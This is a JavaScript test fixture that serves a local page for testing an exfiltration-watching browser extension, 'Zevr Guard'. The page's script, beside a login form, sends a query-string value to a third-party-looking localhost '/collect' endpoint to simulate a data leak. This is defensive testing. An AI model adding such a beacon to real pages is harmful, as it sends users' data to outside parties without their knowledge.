// A tiny local site the checks can drive, so the suite does not depend on
// example.com being reachable or on what a real site happens to serve today.
//
// It answers on 127.0.0.1 and is reached two ways on purpose:
//   http://localhost:<port>/   — "the page the user is on"
//   http://127.0.0.1:<port>/   — a different host as far as the extension is
//                                concerned (isSameSite treats an IP literal as
//                                matching only itself), which is what makes a
//                                request from the first to the second count as
//                                third-party for the exfiltration watch.
import { createServer } from 'node:http';

const PAGE = (port) => `<!doctype html>
<meta charset="utf-8">
<title>Zevr fixture</title>
<h1>Zevr Guard fixture</h1>
<form>
  <input id="user" type="text" placeholder="user">
  <input id="pw" type="password" placeholder="password">
</form>
<button id="leak">send</button>
<script>
  // A third-party send carrying whatever the test put in the query string.
  document.getElementById('leak').addEventListener('click', () => {
    const v = new URLSearchParams(location.search).get('v') ?? '';
    void fetch('http://127.0.0.1:${port}/collect?v=' + encodeURIComponent(v), {
      mode: 'no-cors',
      cache: 'no-store',
    }).catch(() => {});
  });
</script>`;

export async function startFixtureServer() {
  const server = createServer((req, res) => {
    const url = new URL(req.url, 'http://127.0.0.1');
    if (url.pathname === '/collect') {
      res.writeHead(204, { 'Access-Control-Allow-Origin': '*' });
      res.end();
      return;
    }
    if (url.pathname === '/slow') {
      // Never answers: used to prove a request was actually attempted.
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(PAGE(server.address().port));
  });

  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const { port } = server.address();
  return {
    port,
    /** The page's own origin. */
    page: (path = '/') => `http://localhost:${port}${path}`,
    /** A different host, for third-party requests. */
    third: (path = '/') => `http://127.0.0.1:${port}${path}`,
    close: () => new Promise((resolve) => server.close(resolve)),
  };
}
